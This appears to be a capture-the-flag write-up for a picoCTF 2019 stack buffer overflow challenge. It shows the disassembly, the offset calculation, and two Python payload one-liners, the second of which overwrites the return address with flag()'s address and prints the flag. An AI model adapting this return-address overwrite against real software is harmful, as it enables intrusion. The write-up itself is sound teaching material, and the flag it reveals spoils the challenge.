# Overflow 1

There is a simple get_return_address() call which lets us know when we overflow the return address with our input

```
printf("Woah, were jumping to 0x%x !\n", get_return_address());
```

On taking a look at the disassembly of the vuln() function , we can clearly see that the input we give gets stored on to the buffer at [ebp-0x48]

``` 
8048674:       8d 45 b8                lea    eax,[ebp-0x48]
8048677:       50                      push   eax
8048678:       e8 b3 fd ff ff          call   8048430 <gets@plt>
```
So we need to give an input of 0x48 + 0x4 bytes (to override the saved ebp) + 0x4 bytes (to override the saved eip)

```
arch3r@1nv4d3r:~/p1c0CTF_2019/0v3rflow$ python -c 'print("A"*72+"B"*8)' | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x42424242 !
```

Now , Instead of 4 B's we add in the address of the flag() function in the little endian format.
```
arch3r@1nv4d3r:~/p1c0CTF_2019/0v3rflow$ python -c 'print("A"*76+"\xe6\x85\x04\x08")' | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x80485e6 !
flag{0v3rfl0w_1}
```
and there's the flag..!
